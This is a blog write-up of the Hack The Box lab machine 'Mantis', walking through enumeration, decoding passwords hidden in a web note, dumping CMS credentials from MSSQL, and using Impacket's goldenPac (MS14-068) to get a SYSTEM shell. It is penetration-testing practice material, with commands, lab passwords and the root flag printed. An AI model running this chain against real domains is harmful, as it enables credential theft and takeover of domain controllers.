---
layout: post
title: Hackthebox Mantis Writeup
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-08-11/mantis-badge.png)
## Explanation
To practice pentesting for Active Directory environment, solved an old machine "Mantis" on <a href="https://www.hackthebox.eu">Hackthebox</a>.

## Solution
### 1. Initial Enumeration
TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.52 -sC -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-11 10:47 EEST
Nmap scan report for 10.10.10.52
Host is up (0.039s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-08-11 07:58:55Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-08-11T07:49:10
|_Not valid after:  2049-08-11T07:49:10
|_ssl-date: 2019-08-11T07:59:49+00:00; +1m31s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
9389/tcp  open  mc-nmf       .NET Message Framing
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49164/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49168/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-08-11T07:49:10
|_Not valid after:  2049-08-11T07:49:10
|_ssl-date: 2019-08-11T07:59:48+00:00; +1m31s from scanner time.
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 35m48s, deviation: 1h30m43s, median: 1m30s
| ms-sql-info:
|   10.10.10.52:1433:
|     Version:
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2019-08-11T03:59:49-04:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-08-11 10:59:53
|_  start_date: 2019-08-11 10:48:43

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 768.99 seconds
{% endhighlight %}

SMB enumeration:
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.52
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB2_10] server[10.10.10.52]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.52 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -u http://10.10.10.52:1337/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html,htm

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.52:1337/
[+] Threads      : 50
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : htm,php,txt,html
[+] Timeout      : 10s
=====================================================
2019/08/11 21:28:44 Starting gobuster
=====================================================
/secure_notes (Status: 301)
=====================================================
2019/08/11 21:43:55 Finished
=====================================================
{% endhighlight %}

### 2. Getting Root
By enumeration, We found an interesiting page on port 1337.
![placeholder](https://inar1.github.io/public/images/2019-08-11/2019-08-11-11-18-40.png)

We can decode this unknown base64 encoded string with following way.
{% highlight shell %}
root@kali:~# echo 'NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx' | base64 -d
6d2424716c5f53405f504073735730726421

root@kali:~# echo 6d2424716c5f53405f504073735730726421 | xxd -ps -r
m$$ql_S@_P@ssW0rd!
{% endhighlight %}

Besides, if we scroll down the text file, there are some hidden(?) lines.
{% highlight shell %}
root@kali:~# curl http://10.10.10.52:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.

~~~

Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
{% endhighlight %}

We can decode this binary with following way.
{% highlight shell %}
root@kali:~# echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 | perl -lpe '$_=pack"B*",$_'
@dm!n_P@ssW0rd!
{% endhighlight %}

Meaning currently we have 2 credentials.
{% highlight shell %}
m$$ql_S@_P@ssW0rd! # Possible password for MSSQL
@dm!n_P@ssW0rd! # Possible password for OrchardCMS
{% endhighlight %}

Then, try to login to the SQL server.<br>
We have "mssqlclient.py" in the package <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> installed by default.
{% highlight shell %}
root@kali:~# /usr/share/doc/python-impacket/examples/mssqlclient.py -p 1433 admin@10.10.10.52
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:  # m$$ql_S@_P@ssW0rd!
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
{% endhighlight %}

Then, list all databases.<br>
{% highlight shell %}
SQL> select name from master.dbo.sysdatabases
name                                                                                                                               
--------------------------------------------------------------------------------------------------------------------------------   
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
orcharddb        
{% endhighlight %}

Next, try to find a user table for orcharddb.
{% highlight shell %}
SQL> use orcharddb
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.

SQL> select table_name from information_schema.tables where table_name like '%User%'
table_name                                                                                                                         
--------------------------------------------------------------------------------------------------------------------------------   
blog_Orchard_Users_UserPartRecord                                                                                                  
blog_Orchard_Roles_UserRolesPartRecord
{% endhighlight %}

Then, get user credential from the table 'blog_Orchard_Users_UserPartRecord'
{% highlight shell %}
SQL> select column_name from information_schema.columns where table_name='blog_Orchard_Users_UserPartRecord'
column_name
--------------------------------------------------------------------------------------------------------------------------------
Id
UserName
Email
NormalizedUserName
Password
PasswordFormat
HashAlgorithm
PasswordSalt
RegistrationStatus
EmailStatus
EmailChallengeToken
CreatedUtc
LastLoginUtc
LastLogoutUtc

SQL> select UserName,Password from blog_Orchard_Users_UserPartRecord

admin   AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
James   J@m3s_P@ssW0rd!
{% endhighlight %}

To confirm if we can use this credential, we can run smbclient.
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.52 -U james
Enter WORKGROUP\james's password:  # J@m3s_P@ssW0rd! 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.52 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
{% endhighlight %}

After that, we can use "goldenPac.py" for <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068">MS14-068</a>, which is installed by default on the Kali Linux.<br>
At first, add following lines in "/etc/hosts"
{% highlight shell %}
10.10.10.52 htb.local
10.10.10.52 mantis.htb.local
{% endhighlight %}

Then, execute the script with following way to <a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">forge a "Golden ticket"</a> and execute psexec.<br>
We can achieve an system shell.
{% highlight shell %}
root@kali:~# /usr/share/doc/python-impacket/examples/goldenPac.py htb.local/james@mantis.htb.local
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:  # J@m3s_P@ssW0rd!
[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file xcTsamva.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service qxQT on mantis.htb.local.....
[*] Starting service qxQT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
{% endhighlight %}

root.txt is in the home directory of Administrator.
{% highlight shell %}
C:\Users\Administrator\Desktop>type root.txt
209dc756ee5c09a9967540fe18d15567
{% endhighlight %}
